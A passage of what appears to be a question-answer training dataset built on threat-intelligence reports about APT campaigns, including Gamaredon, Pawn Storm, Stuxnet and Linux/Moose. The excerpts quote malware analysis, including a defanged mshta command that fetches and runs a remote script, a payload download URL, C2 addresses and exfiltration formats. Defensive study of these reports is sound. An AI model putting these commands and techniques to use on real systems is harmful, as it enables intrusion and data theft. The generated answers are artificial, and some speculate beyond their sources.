overlaps in tactics with known Russia-linked actors, and the prominent role of CyberBerkut.\n\nQ: In what ways does the phishing campaign targeting David Satter resemble the March 2016 campaign that targeted Hillary Clinton's presidential campaign and the Democratic National Committee? What does this similarity suggest about the potential relationship between these campaigns?",
    "output": "A: The phishing campaign targeting David Satter resembles the March 2016 campaign that targeted Hillary Clinton's presidential campaign and the Democratic National Committee in several ways. First, the phishing URLs in both campaigns were encoded with a distinct set of parameters using base64. Second, both campaigns used a Google security-themed phishing ruse. Third, both campaigns abused URL shortening services. These similarities suggest possible code reuse, indicating that the two operations may be using the same phishing 'kit'. Additionally, the victimology of both campaigns is strikingly similar, with targets including individuals in Russia and the former Soviet states, current and former military and government personnel in the U.S. and Europe, individuals working in the defense and government supply chain, authors and journalists, and email accounts linked to the November 2016 United States presidential election.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: INTRODUCTION\nOperation Pawn Storm refers to economic and political espionage attacks instigated by a group of threat actors primarily targeting military, embassy, and defense contractor personnel from the United States and its allies. Opposing factions to and dissidents of the Russian government, international media, and even the national security department of a U.S. ally were also targeted. The threat actors used three attack vectors\u2015 spear-phishing emails with malicious attachments, an advanced network of phishing websites, and exploits injected into legitimate conference and media websites. They used a nonmalicious JavaScript to victimize Microsoft\u2122 Outlook\u00ae Web Access (OWA) users from carefully selected target organizations. The OWA phishing attacks proved extremely effective and could be\nparticularly dangerous to any organization that allows employees to use OWA.\nAn in-depth look at six multistage attacks revealed one thing in common\u2015the use of SEDNIT/Sofacy malware [1], [2]. The use of such multistage downloaders provided attackers additional protection against detection. We believe the threat actors aimed to confuse their targets' IT administrators by making it hard for them to string attack components together, thus evading detection.\nThis research paper details when certain attacks occurred, what tools were used in attempts to get in to target networks, and target profiles to form a general picture of Operation Pawn Storm.\nAnswer this question: Why did the threat actors behind Operation Pawn Storm use multiple attack vectors, including spear-phishing emails, phishing websites, and exploits injected into legitimate websites? How did this strategy enhance their ability to evade detection and compromise their targets?",
    "output": "The threat actors behind Operation Pawn Storm employed multiple attack vectors, such as spear-phishing emails with malicious attachments, an advanced network of phishing websites, and exploits injected into legitimate conference and media websites, to diversify their methods of infiltration. This approach enhanced their ability to evade detection and compromise their targets by increasing the likelihood that at least one method would succeed. Additionally, they used a nonmalicious JavaScript to target Microsoft\u2122 Outlook\u00ae Web Access (OWA) users from carefully selected organizations, which proved particularly effective. By using various techniques, the attackers made it more difficult for IT administrators to identify and correlate different components of the attacks, thereby providing additional protection against detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the TeleBots group's tactics evolve in terms of phishing attacks, and what was the significance of this evolution in their supply-chain attacks against Ukraine?",
    "output": "Phishing: Spearphishing Attachment is a type of social engineering attack where adversaries send targeted emails with malicious attachments to gain access to victim systems. In the case of the TeleBots group, they initially used spearphishing emails with documents containing malicious macros to conduct attacks. However, they later evolved their tactics to employ a more sophisticated scheme known as a supply-chain attack. This evolution is significant because it shows that the group moved away from relying solely on spearphishing attachments and instead exploited vulnerabilities in the supply chain to spread their malware. This shift in tactics allowed them to target a wider range of victims and industries, including businesses in Ukraine. The fact that the malware went out of control suggests that the group may have underestimated the spreading capabilities of their malware, highlighting the potential risks and unintended consequences of using such tactics.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the structure and dynamics of the NCPH hacker group contribute to their effectiveness in carrying out targeted attacks in 2006?",
    "output": "The NCPH hacker group was composed of college students who likely lived together and supported each other's hacking interests. This close-knit environment allowed for efficient collaboration and coordination. Wicked Rose, the leader, managed 'hacker for hire' relationships and paid group members, which incentivized their work. Their income increased significantly during the targeted attacks in 2006, enabling them to dedicate more time to hacking. This structure and financial motivation contributed to their effectiveness in developing and deploying sophisticated exploits.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How could the threat actors behind the Sea Turtle campaign potentially utilize Process Injection: Process Hollowing to evade detection and maintain persistence in the targeted networks?",
    "output": "Process Injection: Process Hollowing is a technique used by adversaries to inject malicious code into suspended and hollowed processes, allowing them to evade process-based defenses. In the context of the Sea Turtle campaign, the threat actors demonstrated a high level of sophistication and ability to adapt to various security measures. One potential way they could utilize Process Injection: Process Hollowing is by creating a legitimate process on a compromised system, suspending it, and then unmapping its memory to replace it with malicious code. This would enable them to execute arbitrary code in the address space of a separate live process, potentially evading detection from security products. Furthermore, since the injected process would inherit the security context of the injecting process, it would likely not result in elevated privileges, but it would still allow the threat actors to maintain persistence in the targeted network. Given the threat actors' ability to impersonate VPN applications and perform MitM attacks, it is possible that they could use Process Injection: Process Hollowing to inject malicious code into legitimate processes, making it even more challenging for security products to detect their activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3.2.1 Legal Analysis\nAlthough the UN and EU expressed their grave concerns about Russia's annexation of Crimea, and NATO called it a violation of international law,19 Russia defended its actions as the lawful protection of the Russian speaking minority in Crimea. States have the right to act when necessary to rescue their nationals abroad. However, in this case, there were no indications that native Russians were in danger. Even if that were the case, it could only have justified their evacuation, not the occupation of the entire peninsula.20 A second possible justification for Russian intervention was an invitation by the Ukrainian authorities, i.e. President Yanukovych. But, after Yanu-kovych was replaced by the Interim Government, his actions could not be attributed to Ukraine anymore.21 A third possible justification is the right to self-determination for the people of Crimea. However, while this right exists for 'peoples' within the existing borders of a state, it does not allow for a complete political separation.22\nRussia's annexation of Crimea was a breach of international law by violating the territorial integrity of Ukraine. Russia also breached the 1994 Budapest Memorandum and the 1997 Treaty on Friendship, Cooperation, and Partnership.23 The Black Sea Fleet Status of Forces Agreement allowed for a Russian military presence in Crimea, but not at the scale as was the case in March 2014. But was this armed intervention also a use of force, a violation of Article 2(4) of the UN Charter?24 Moving armed forces to the territory of another state, without the consent of that state, should definitely be considered a use of force.25 That is exactly what happened: troops belonging to the Russian Black Sea Fleet in Crimea left their bases, and there were clear indications that other Russian\nRussia's annexation of Crimea was a breach of international law.\n19 \u02bb[A] spokesman for (<https://en.wikipedia.org/wiki/UN_Secretary-General>)UN Secretary-General (<https://en.wikipedia.org/wiki/Ban_Ki-moon>)Ban Ki-moon delivered a statement saying that he was 'gravely concerned about the deterioration of the situation' in Ukraine and planned to speak shortly with Putin. It also called for 'full respect for and preservation of the independence, sovereignty and territorial integrity of Ukraine' and demanded 'immediate restoration of calm and direct dialogue between all concerned'. (<https://en.wikipedia.org/wiki/High_Representative_of_the_Union_for_Foreign_Affairs_and_Security_Policy>)Representative of the Union for Foreign Affairs and Security Policy (<https://en.wikipedia.org/wiki/Catherine_Ashton>)Cathe-(<https://en.wikipedia.org/wiki/Catherine_Ashton>)rine Ashton stated that the EU \"deplores\" what it called Russia's decision to use military action in Ukraine, describing it as an \"unwarranted escalation of tensions\". She called on \"all sides to decrease the tensions immediately through dialogue, in full respect of Ukrainian and international law\". She added that: 'The unity, sovereignty and territorial integrity of Ukraine must be respected at all times and by all sides. Any violation of these principles is unacceptable'. North Atlantic Council condemned what it called Russia's military escalation in Crimea and called it a breach of (<https://en.wikipedia.org/wiki/International_law>)international law'. International reactions to the annexation of Crimea by the Russian Federation, Wikipedia, accessed 1 August 2015, (<https://en.wikipedia.org/wiki/International_reactions_to_the_annexation_of_Crimea_by_the_Russian_Federation>)https://en.wikipedia.org/wiki/Interna-(<https://en.wikipedia.org/wiki/International_reactions_to_the_annexation_of_Crimea_by_the_Russian_Federation>)tional_reactions_to_the_annexation_of_Crimea_by_the_Russian_Federation.\n20 See also: Marc Weller, in BBC News, 'Analysis: Why Russia's Crimea move fails legal test', BBC News, 7 March 2014, http://www. bbc.com/news/world-europe-26481423.\n21 See also: Christian Marxsen, 'The Crimea Crisis \u2013 An International Law Perspective,' Zeitschrift f\u00fcr ausl\u00e4ndisches \u00f6ffentliches Recht und V\u00f6lkerrecht (Heidelberg Journal of International Law) 74/2 (2014): 367-391; Remy Jorritsma. 'Ukraine Insta-Symposium: Certain (Para-)Military Activities in the Crimea: Legal Consequences for the Application of International Humanitarian Law', Opinio Juris, 9 March 2014, http://opiniojuris.org/2014/03/09/ukraine-insta-symposium-certain-para-military-activities-crimea-legal-consequences-application-international-humanitarian-law/; Ashley Deeks. 'Here's What International Law Says About Russia's Intervention in Ukraine', New Republic, 2 March 2014, (<http://www.newrepublic.com/article/116819/international-law-russias-ukraine-intervention>)http://www.newrepublic.com/article/116819/inter-(<http://www.newrepublic.com/article/116819/international-law-russias-ukraine-intervention>)national-law-russias-ukraine-intervention.\n22 Marxsen. 'Crimea Crisis,' 14; Jorritsma. 'Legal Consequences.'\n23 The 1994 Budapest memorandum was intended to provide Ukraine security in exchange of accession to the Treaty on the Non-Proliferation of Nuclear Weapons. Russia, the United States, and the United Kingdom committed to 'respect the independence and sovereignty and the existing borders of Ukraine'. The 1997 Treaty on Friendship, Cooperation, and Partnership between Russia and Ukraine was to guarantee the inviolability of the borders between both states. See also: Marxsen, 'Crimea Crisis,' 4-5.\n24 Charter of the United Nations, San Francisco, 26 June 1945, Article 2(4).\n25 See also: Deeks. 'What International Law Says.'\ntroops were sent to Crimea to secure strategic sites, block Ukrainian troops, and essentially force them to leave the peninsula.\nStates can take measures in response to violations of international law. In this case the European Union and the United States imposed sanctions on Russia.\nCould Russia's actions be seen as an armed attack, in which case Ukraine would have had the right to use force in self-defence?26 Like 'use of force', 'armed attack' is not defined in the UN Charter; in essence, a state determines on a case-by-case basis whether it considers an attack against it as an 'armed attack'. A violent attack with military forces resulting in damage and casualties would certainly be seen as an armed attack. In the case of Crimea, however, hardly a shot was fired. On the other hand, it is difficult to argue that Ukraine would not have the right to use force to drive Russian troops out of Crimea.27\nIrrespective this analysis of the legal basis of the intervention in Crimea, what would be the legal regime for the operations conducted by the parties to the conflict, including the cyber operations? Did the situation qualify as an 'international armed conflict' where the Law of Armed Conflict applies? The criterion here is that it relates to hostilities between nation-states. In Crimea, however, the situation was unclear. Firstly, there was no fighting, although the threshold for 'armed' is low.28 Secondly, Russia denied the troops present were theirs and referred to them as 'local self-defence groups'. However, reports indicated the active involvement of Russian troops29 and, eventually, Putin admitted that Russian troops were present.30 Even in the event that only local forces were active, a situation of international armed conflict could still prevail if they were acting under Russia's control.\nThe Law of Armed Conflict applies in a situation of total or partial occupation.\nThe Law of Armed Conflict also applies in a situation of a total or partial occupation, even if the occupation did not meet armed resistance.31 Occupation is a 'hostile substitution of territorial power and authority'. 32 This is precisely the case in Crimea, where Russia exercises territorial control without the consent of the Ukrainian Government.\n26 Charter of the United Nations, Article 51.\n27 Deeks. 'What International Law Says.'\n28 'Any difference arising between two States and leading to the intervention of members of the armed forces is an armed conflict within the meaning of Article 2, even if one of the Parties denies the existence of a state of war. It makes no difference how long the conflict lasts, or how much slaughter takes place. The respect due to the human person as such is not measured by the number of victims', ICRC Commentary to the Geneva Conventions of 1949, 20-21.\n29 For example: 'Ukrainian and Russian troops in standoff at Crimean military base \u2013 As it happened', The Guardian, 3 March 2014, (<http://www.theguardian.com/world/2014/mar/02/ukraine-warns-russia-crimea-war-live>)http://www.theguardian.com/world/2014/mar/02/ukraine-warns-russia-crimea-war-live; and 'Russian troops storm Ukrainian bases in Crimea', BBC News, 22 March 2014, http://www.bbc.com/news/world-europe-26698754\n30 'Putin Admits Russian Troop Role in Crimea Annexation', Voice of America, 17 November 2014, http://www.voanews.com/ content/putin-admits-russian-troop-role-in-crimea-annexation/2523186.html; 'Putin admits Russian forces were deployed to Crimea', Reuters, 17 April 2014, http://uk.reuters.com/article/2014/04/17/russia-putin-crimea-idUKL6N0N921H20140417.\n31 Geneva Conventions, 12 August 1949, Common Article 2.\n32 Hague Regulations: Regulations concerning the Laws and Customs of War on Land, 18 October 1907, Article 42. See also: Jorritsma, 'Legal Consequences.'\nRead the text above and answer this question: Why was Russia's annexation of Crimea considered a breach of international law, and what specific treaties and agreements did it violate?",
    "output": "Russia's annexation of Crimea was considered a breach of international law because it violated the territorial integrity of Ukraine. Specifically, it breached the 1994 Budapest Memorandum, which committed Russia to respect Ukraine's independence and sovereignty, and the 1997 Treaty on Friendship, Cooperation, and Partnership, which guaranteed the inviolability of the borders between Russia and Ukraine. Additionally, the Black Sea Fleet Status of Forces Agreement allowed for a Russian military presence in Crimea but not at the scale seen in March 2014.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Initial Access\nGamaredon APT actors likely gained initial footholds into targeted networks through malicious Microsoft Office documents distributed via email. This is consistent with spear-phishing techniques common to this APT.\nMalicious VBS macros concealed within remote templates execute when the user opens the document. The macros download RAR archives containing LNK files. The naming convention of the RAR archives in this campaign follows a similar pattern:\n31.07.2022.rar\n04.08.2022.rar\n10.08.2022.rar\nThese compressed archives usually contain just the LNK file. The LNK files and Microsoft Office document names contain references pertinent to the Russian invasion of Ukraine:\nMedium Headline: Execution\nOnce opened, the LNKs will attempt to execute MSHTA.EXE to download and parse a remote XML file to execute a malicious PowerShell script:\nmshta.exe hxxp://a0704093.xsph[.]ru/bass/grudge.xml /f\nGamaredon is  the domain xsph[.]ru. The servers in this campaign only allow access from IP addresses inside the Ukrainian address space.\nThis PowerShell script decodes and executes a second PowerShell script (instrumentor), which collects data from the victim and reports back to a remote server. This script also allows the remote server to send a PowerShell command or binary blob containing encrypted VBScript (VBS) code to be executed locally:\nSecond-stage PowerShell script that runs additional commands and payloads on the endpoint.\nThe instrumentor PowerShell script usually consists of a function that decodes the encrypted response from the command and control (C2) server and executes it as a VBScript object. The key used in the XOR decoder is calculated based on the machine's volume serial number plus index parameters passed in the response blob. This method makes it difficult to decode the malicious content if an observer looking at the data doesn't have both parameters available.\nThe PowerShell script also repeatedly captures the current user's screen. This code uses the \"System.Windows.Forms\" object to capture a copy of the virtual desktop, including setups with multiple screens. The screen capture is executed nine times, but the resulting screenshot is always saved to \"%TEMP%\\test.png\", which gets overwritten every time. The resulting image (PNG file) is then converted to a base64-encoded string, stored in a variable and the screenshot image file is removed from the disk.\nThe script then proceeds to upload the victim's information to the remote server. The following information is then collected and exfiltrated to a hardcoded C2 URL.\nComputer name.\nVolume serial number.\nBase64-encoded screenshot.\nUpon sending the system information, the server response is parsed to see if there are commands to be executed. The entire script runs up to four times, thus up to four different commands can be executed each time.\nThe code checks if the first character is an exclamation point (\"!\"). If so, the remainder of the response is expected to be a PowerShell code that is passed directly to the command IEX. The output of that command is then added to the variable \"cmd\" and sent back to the C2 server.\nIf the response starts with any other character, it is treated as an encrypted blob and passed to the decoder function, along with the volume serial number to be decoded and executed as VBScript.\nInfection chain diagram.\nMedium Headline: Yet another PowerShell script\nOne of the payloads served to the instrumentor script was PowerShell code used to set an environmental variable with PowerShell code in it and a Registry RUN key to run every time the user logs in.\nPowerShell script setting up the RUN key to execute another PowerShell script stored in the environment variable.\nThere are two key components to this script:\nThe Get-IP function: This function queries a DNS lookup service for an attacker-specified domain and uses one of the returned IP addresses as the IP to download the next payloads.\nNext-stage payload: The PowerShell script uses the IP address to construct a URL that serves the next-stage PowerShell script, which is subsequently stored in \"$env:Include\" and executed when the user logs in (via the HKCU\\\\Run key).\nPersistence script fetching the remote location's IP.\nThe PowerShell code residing in the environment variable is meant to provide the attackers with continued access to the infected endpoint with the capability to deploy additional payloads as desired. A similar PowerShell script was described in describing intrusions conducted by Gamaredon in the first half of 2022 using the GammaLoad and GammaSteel implants.\nPowerShell script stored in the env variable.\nThis script uses the same Get-IP() function to get a random IP assigned to the domain and queries a URL constructed from the IP address and a hardcoded extended resource. Just like the previous script, the computer name and volume serial number are used again in communications with the C2 server. The C2 server uses them to encode the next-stage payload subsequently served to the script.\nIf the response from the C2 starts with the string \"http\", the content is treated as the URL to download the final payload binary. The Volume Serial Number and Computer Name are passed to this URL and the response is decoded using the XorBytes function.\nPowerShell function used to decode payloads from C2 server.\nThe decrypted binary is then saved to the \"%TEMP%\" folder with a name consisting of a random string of numbers and the \".exe\" file extension and is executed.\nAlternatively, if the response from the C2 does not begin with the \"http\" string, the content is treated as a VBS and executed via a COM object.\nMedium Headline: Infostealer\nOne of the executables deployed by the attackers via the PowerShell script consisted of an information stealer that exfiltrates files of specific extensions from the infected endpoint: .doc, .docx, .xls, .rtf, .odt, .txt, .jpg, .jpeg, .pdf, .ps1, .rar, .zip, .7z and .mdb. This is a new infostealer that Gamaredon has not previously used in other campaigns. We suspect it may be a component of Gamaredon's \"Giddome'' backdoor family, but we are unable to confirm that at this time.\nThe malicious binary keeps track of what has been exfiltrated in a file named \"profiles_c.ini\" in the \"%USERPROFILE%\\Appdata\\Local\" folder. The malware stores the MD5 hash of a string containing the filename, file size and modification date of the exfiltrated file.\nOnce started, the malware scans all attached storage devices looking for files with the aforementioned extensions. For each one, the malware makes a POST request with metadata about the exfiltrated file and its content.\nPOST data to exfiltrate files.\nThe parameter \"p\" contains metadata about the stolen file and the victim machine using the following format:\n%u&&%s&&%s&&%s&&%s&&%s\nWhere the various parameters are:\n<Hard_coded_value>&&<File_name>&&<File_Modification_Date_time>&&\n<FileSize>&&__&&<Computer_Name>&&<Username>&&\n<Victim_ID_randomly_generated_string_12_chars>&&<Volume Serial Number>\nThe raw content of the file comes after the metadata. The request is made to a random URI under the parent C2 domain. The implant generates a random 12-character string that acts as a subdomain for the C2 domain to send requests to:\nE.g. <random_12_char_string>[.]celticso[.]ru\nThe implant will also search for the relevant file extensions in fixed and remote drives and specifically in the \"C:\\Users\" folder. The implant enumerates all the files recursively in the directories on the system while avoiding enumeration of any folder containing the following strings in the path:\nprogram files\nprogram files (x86)\nprogramdata\nperflogs\nprog\nwindows\nappdata\nlocal\nroaming\nAvoiding these folders is likely an attempt by the malware to avoid exfiltrating system files thereby focussing on user files of interest only.\nFor each file exfiltrated to the C2, the implant calculates the MD5 hash for the following information and stores it in the \"%LocalAppData%\\profiles_c.ini\" file:\n<file_path><File_size><File_modification_date_time>\nThe implant also steals files from removable drives connected to the infected endpoint. When the implant finds a removable drive, it looks for files with the file extensions listed earlier. Once a file is found, the implant creates a randomly named folder in the %TEMP% directory and copies the original file from its original location to:\n%Temp%\\<randomly_named_folder>\\connect\\<removable_vol_serial_number>\\ <original file path>\nFor example, a user file found in a remote drive \"E:\" at path\n\"E:\\top_secret_docs\\isengard.doc\" will be copied to\n\"%temp%\\randomly_named_folder\\connect\\\n<removable_vol_serial_number>\\top_secret_docs\\isengard.doc\"\nThe contents of the folder in the temp directory are subsequently exfiltrated to the C2.\nSmall Headline: Deliver payloads\nAs with this actor's previous tools (e.g., the PS1 scripts), this binary also parses the server response and downloads additional payloads if requested. The response from the server consists of a flag indicating how the data should be treated:\nCode depicting the dropping of additional payloads.\nThere are other indications this malware may be present on the system, listed below:\nA registry key is created under HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run with the name \"Windows Task\" for persistence\nA mutex is created with the name Global\\flashupdate_r\nAnswer this question: Describe the functionality and behavior of the information stealer deployed by Gamaredon APT, including the types of files it targets and how it ensures efficient exfiltration of data.",
    "output": "One of the executables deployed by the attackers via the PowerShell script is an information stealer that exfiltrates files of specific extensions from the infected endpoint, such as .doc, .docx, .xls, .rtf, .odt, .txt, .jpg, .jpeg, .pdf, .ps1, .rar, .zip, .7z, and .mdb. This is a new infostealer that Gamaredon has not previously used in other campaigns. The malicious binary keeps track of what has been exfiltrated in a file named 'profiles_c.ini' in the '%USERPROFILE%\\Appdata\\Local' folder. The malware stores the MD5 hash of a string containing the filename, file size, and modification date of the exfiltrated file. Once started, the malware scans all attached storage devices looking for files with the aforementioned extensions. For each one, the malware makes a POST request with metadata about the exfiltrated file and its content. The implant avoids enumerating folders containing strings like 'program files', 'program files (x86)', 'programdata', 'perflogs', 'prog', 'windows', 'appdata', 'local', and 'roaming' to focus on user files of interest only.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: A Look Behind the Scenes\nLooking at logs for the subaat webserver between July 1st and July 20th shows the IP address of 115.186.136[.]237 uploading and interacting with a number of malicious files. We found interactions with a total of 64 unique files during this period. Below is a chart showing the attacker at this IP address interacting with some of the more popular malware families that have been identified.\nAs we can see from the chart above, a spike of activity took place in the July 11th to July 16th timeframe. This again is consistent with the email campaign that took place in the midst of this period. A number of malware families have been used by this specific attacker, and many of them are configured to communicate with 115.186.136[.]237 as the C2.\nConclusion\nWhat started out as a simple look into what appeared to be a targeted phishing campaign turned into much more. By the end of this research endeavor, we have identified a server hosting a large number of malware samples that has been primarily used by one specific IP address. This IP address not only interacted with this web server, but also acted as a C2 server for many of these malware families. While looking at malware associated with this actor, we discovered an email address that is tied to a user account on HackForums that has a name consistent with the domain used to host the actor's malware.\nWe saw similarities this campaign and both the Operation Transparent Tribe and Operation C-Major campaigns. Additionally, there is marginal evidence that suggests that the attacker may be based in Pakistan, which is again in line Operation Transparent Tribe. However, the overall evidence is not conclusive, and there is insufficient proof to say decisively that this is the same threat actor.\nPalo Alto Networks customers are protected by this threat in a number of ways:\nAll identified samples are flagged as malicious within the Palo Alto Networks platform\nAll domains identified within this research have been appropriately marked as malicious\nTraps correctly identified and blocks the exploits using CVE-2012-0158 and CVE-2017-0199\nAppendix\nBig Headline: Analysis of Malicious RTF Documents\nThe two identified samples that were used in a campaign against a US-based government organization has the following SHA256 hashes:\n0ade053b355eca7ae1fccea01fe14ff8d56a9d1703d01b3c00f7a09419357301 9a57f96a3fd92b049494807b6f99ffcd6bb9eb81f4f5b352d4b525ad32fac42d\nThese samples varied in size greatly, however, the underlying shellcode was consistent. One notable difference observed in one of the samples (0ade05\u2026) was the inclusion of injecting the shellcode into a newly spawned instance of svchost.exe.\nWhen the shellcode begins, it will start by loading a number of functions that are used to inject code into svchost.exe. The following Python code demonstrates how this hashing function operates:\nThe shellcode continues to decrypt a blob of data using a 4-byte XOR key of 0x8F51F053. This blob contains a series of important strings, such as the URL and filename, as well as functions that will be used to download the payload.\nAfter this blob is decrypted, flow control proceeds to this blob's code, where the shellcode will load multiple libraries and functions using a specific hashing algorithm.\nThe shellcode continues download a file to the %TEMP% directory from the following URL:\nhttp://subaat[.]com/files/sp.exe\nThe shellcode proceeds to execute this newly downloaded file prior to exiting.\nBig Headline: Analysis of Malicious Excel Documents\nThe identified sample that was used in a campaign against a US-based government organization has the following SHA256 hash:\ne3243674aa3661319903a8c0e1edde211f1ffdeed53b305359d3390808007621\nWhen this sample is initially executed, it will attempt to run a malicious macro that is embedded within the file. This macro begins by determining where a dropped file will reside. It will attempt to find the following folders residing within a user's profile path:\n/Documents\n/Downloads\n/AppData\nThe payload itself is stored within text boxes in a user form within the Excel document. This data is extracted and hex-decoded. The three blobs of data are concatenated to form a proper PE32 executable.\nA quick look at the included user form gives us a better view as to how this data is stored.\nThe following example Python code demonstrates the hex-decoded data shown in the highlighted text box above.\nAfter this data is properly handled, the macro will drop this file with an extension of .scr to the designated file path. It is then executed in a new process. This newly spawned process is an instance of the Crimson Downloader malware family.\n\nHow did the analysis of the subaat webserver logs reveal the activities of the attacker, and what insights were gained from the timeline of interactions?",
    "output": "A: The analysis of the subaat webserver logs between July 1st and July 20th showed the IP address 115.186.136[.]237 uploading and interacting with a number of malicious files. During this period, interactions with a total of 64 unique files were observed. The logs revealed a spike of activity in the July 11th to July 16th timeframe, which coincided with the email campaign. This activity indicated that the attacker was actively managing and deploying various malware families, many of which were configured to communicate with 115.186.136[.]237 as the Command and Control (C2) server.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "\u2022 ID specifies the parameter to change. The format of the ID field is detailed in Table 6.\n\u2022 VALUE contains the new value for the particular parameter. For frequency values, a factor of ten can be applied if the system was determined to be using deciHz units.\n\u2022 CW (ControlWord) in sequence A is typically set to 47Fh, which means 'Run', but can start by sending 477h (Stop by Coast) and finishes by using 4FFh (Fault Reset). CW in sequence B is set to 403h.\n\u2022 REF can range from 100% to -100% represented by 10000 or -10000. This specifies the drive should be operating at the maximum (100%) frequency either in a forward (positive 10000) or reverse (negative 10000) direction. The previous direction, before the behavior of the frequency converter drives were hijacked, is maintained, but at 100% potentially with a new maximum frequency.\nThe parameters that are modified and their values are in Appendix C. To more clearly illustrate the behavior of the injected code, we've outlined the key events that would occur with an infected 315-2 CPU connected to multiple CP 342-5 modules each with 31 frequency converter drive slaves, as shown in the diagram below.\nFigure 27\nConnections between sequence blocks\n\u2022 The PLC is infected.\n\u2022 Frequency converter slaves send records to their CP-342-5 master, building a frame of 31 records The CPU records the CP-342-5 addresses.\n\u2022 The frames are examined and the fields are recorded.\n\u2022 After approximately 13 days, enough events have been recorded, showing the system has been operating between 807 Hz and 1210 Hz.\n\u2022 The infected PLC generates and sends sequence 1 to its frequency converter drives, setting the frequency to 1410Hz.\n\u2022 Normal operation resumes.\n\u2022 After approximately 27 days, enough events have been recorded.\n\u2022 The infected PLC generates and sends sequence 2 to its frequency converter drives, setting the frequency\ninitially to 2Hz and then 1064Hz.\n\u2022 Normal operation resumes.\n\u2022 After approximately 27 days, enough events have been recorded.\n\u2022 The infected PLC generates and sends sequence 1 to its frequency converter drives, setting the frequency to 1410Hz.\n\u2022 Normal operation resumes.\n\u2022 After approximately 27 days, enough events have been recorded.\n\u2022 The infected PLC generates and sends sequence 2 to its frequency converter drives, setting the frequency initially to 2Hz and then 1064Hz.\n\u2022 \u2026\nQ: How does W32.Stuxnet manipulate the frequency converter drives, and what specific frequencies does it set during its sequences? Explain the significance of these changes in the context of industrial control systems.",
    "output": "W32.Stuxnet manipulates the frequency converter drives by sending specific sequences that alter their operational frequencies. During sequence 1, Stuxnet sets the frequency to 1410Hz. In sequence 2, it initially sets the frequency to 2Hz and then to 1064Hz. These changes are significant because they disrupt the normal operation of the industrial control systems. By setting the frequency to 1410Hz, Stuxnet likely aims to cause physical damage to the machinery, as this frequency is higher than the typical operating range of 807 Hz to 1210 Hz. The sequence 2 frequencies, starting at 2Hz and then increasing to 1064Hz, could be designed to induce instability or further damage, potentially leading to equipment failure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: Scanning close to home\nAs we mentioned earlier, the configuration C&C server returns the public IP address it saw when it was contacted by the infected router. This IP address is then used as a basis for near-home scanning on the Telnet port. The IP addresses reached this way are random, but all inside the same /15 network of the infected router's public IP. This can effectively bypass firewalls on the perimeter and allow the worm to spread further copies of itself.\nThe above diagram illustrates why the operators focus more on the near home scanning. Black lines represent network connectivity and yellow arrows represent network interactions.\nHere we highlighted:\n1. An infected router trying to spread from across the Internet can't get past the firewall\n2. An infected router able to propagate past a badly firewalled router that is exposing its Telnet service to the whole Internet\n3. How, due to the near home scan, routers behind the same network have a greater chance of being quickly found and infected if the firewall is allowing Telnet from the same network.\nDuring our monitoring of an infected device we saw that Telnet access was 3 times more successful when scanning for near-home IP addresses than when scanning random IP addresses on the Internet. We think this difference is explained by NAT and misconfigured firewalls. This doesn't surprise us given the complexity of modern networks and the amount of firewall rules they need. Furthermore,  demonstrated a correlation between the complexity and volume of firewall rules and the number of errors made in their configuration \u2014 badly locked- down Telnet access being one of the errors mentioned in the study.\nAdditionally, the worm will launch an extra  per IP interface present on the system, carefully avoiding /32 IPs (IP aliases) and loopback interfaces (like 127.0.0.1):\nThis enables the worm to spread inside Local Area Networks (LANs) that are not normally accessible from the Internet due to the use of firewalls and network address translation (NAT). On successful infection, the newly-compromised machine will spawn scanners on its own internal IP interfaces and thus go deeper inside the private network.\nThis type of  is very interesting for a couple of reasons:\n\u2022 Some networks assume perimeter that firewalls are enough protection and often tolerate the use of weak credentials internally\n\u2022 Routers are the . Access to them means access to previously unreachable vertices.\n\u2022 All sort of networks could be revealed to the operators: 3rd party vendors, business partners, private clouds, extranets, etc.\n\u2022 Network provider equipment has been traditionally managed via Telnet\n\u2022 Consumer devices in-the-field tend to reset to factory defaults, which render them vulnerable even if provider had applied due diligence by changing default credentials\nVery Small Headline: Custom NAT traversal\nAnother interesting capability related to network penetration is the custom NAT traversal implementation. It could be categorized as a simple implementation of the concepts behind the Session Traversal Utilities for NAT () and Traversal Using Relays around NAT () standards.\nThe configuration given by the configuration C&C server to the infected host provides both its public IP address and the address of a system that is going to be used as a relay (relay C&C server). During our analysis of the threat the relay C&C IP address was always the same: 93.190.140.221. The configuration values affecting the behavior of the NAT traversal are the following:\nTable 6. Moose Configuration Values Affecting the Behavior of the NAT Traversal\nWe will explain where these values come from when we will describe the  further along.\nIf NAT traversal is enabled, two threads are created at start-up that are dedicated to reach the relay C&C server. The relay is queried at short intervals (defined by cnccfg_relaycnc_sleep) for anything to proxy through the infected host. The server replies either with one IP address and port (for outreach) or multiple pairs of IP addresses and ports (for relay).\nFirst the infected device reaches out to the relay with this hardcoded packet:\n18 00 00 00\nThe server responds with the following structure:\nTable 8. Moose NAT traversal supported commands\nFor example:\n1. Mode requested by relay C&C server. ex: TCP Tunnel\n2. Tunnel destination port (network order). ex: 80\n3. Tunnel destination IP address (network order). ex: 192.168.1.1\nThe infected host will then connect on the tunnel destination it has received. Upon successful connection, it will hand over the two sockets to a thread dedicated to move the data back and forth between the tunnel destination and the relay C&C server.\n7 The multiple tunnel packet format varies from the simple TCP tunnel. Due to time constraints it was not documented. Interested readers should look at virtual address 0x405A4C of the bfc2a99450977dc7ba2ec0879fb17c612e248ece sample.\nThis way, even if a host is unreachable from the Internet because of firewalls or NAT, the operators can still use the infected host. During our monitoring of the threat, we saw tunnels being made to reach social networks. However, most of the time, the server was seen to respond with a TCP reset (RST) and sometimes sleep commands.\nVery Small Headline: 5.2. Moose Crossing \u2014 Proxy Service\nOne of the first thing Linux/Moose does is to start listening on TCP port 10073 for incoming connections. , this server is used by the bot to assess whether a 